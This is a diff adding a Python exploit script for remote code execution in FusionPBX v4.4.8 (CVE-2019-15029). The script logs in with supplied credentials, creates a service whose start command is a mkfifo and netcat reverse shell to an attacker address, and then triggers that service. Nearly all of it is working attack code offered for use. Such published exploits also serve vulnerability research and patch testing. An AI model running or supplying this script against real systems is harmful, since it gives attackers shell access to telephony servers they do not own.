@@ -1,0 +1,83 @@
+#!/usr/bin/python3
+
+'''
+# Exploit Title: FusionPBX v4.4.8 Remote Code Execution
+# Date: 13/08/2019
+# Exploit Author: Askar (@mohammadaskar2)
+# CVE : 2019-15029
+# Vendor Homepage: https://www.fusionpbx.com
+# Software link: https://www.fusionpbx.com/download
+# Version: v4.4.8
+# Tested on: Ubuntu 18.04 / PHP 7.2
+'''
+
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+import sys
+import warnings
+from bs4 import BeautifulSoup
+
+# turn off BeautifulSoup and requests warnings
+warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+if len(sys.argv) != 6:
+    print(len(sys.argv))
+    print("[~] Usage : ./FusionPBX-exploit.py url username password ip port")
+    print("[~] ./exploit.py http://example.com admin p@$$word 172.0.1.3 1337")
+
+    exit()
+
+url = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+ip = sys.argv[4]
+port = sys.argv[5]
+
+
+request = requests.session()
+
+login_info = {
+    "username": username,
+    "password": password
+}
+
+login_request = request.post(
+    url+"/core/user_settings/user_dashboard.php",
+     login_info, verify=False
+ )
+
+
+if "Invalid Username and/or Password" not in login_request.text:
+    print("[+] Logged in successfully")
+else:
+    print("[+] Error with creds")
+
+service_edit_page = url + "/app/services/service_edit.php"
+services_page = url + "/app/services/services.php"
+payload_info = {
+    # the service name you want to create
+    "service_name":"PwnedService3",
+    "service_type":"pid",
+    "service_data":"1",
+
+    # this value contains the payload , you can change it as you want
+    "service_cmd_start":"rm /tmp/z;mkfifo /tmp/z;cat /tmp/z|/bin/sh -i 2>&1|nc 172.0.1.3 1337 >/tmp/z",
+    "service_cmd_stop":"stop",
+    "service_description":"desc",
+    "submit":"Save"
+}
+
+request.post(service_edit_page, payload_info, verify=False)
+html_page = request.get(services_page, verify=False)
+
+soup = BeautifulSoup(html_page.text, "lxml")
+
+for a in soup.find_all(href=True):
+    if "PwnedService3" in a:
+        sid = a["href"].split("=")[1]
+        break
+
+service_page = url + "/app/services/services.php?id=" + sid + "&a=start"
+print("[+] Triggering the exploit , check your netcat !")
+request.get(service_page, verify=False)
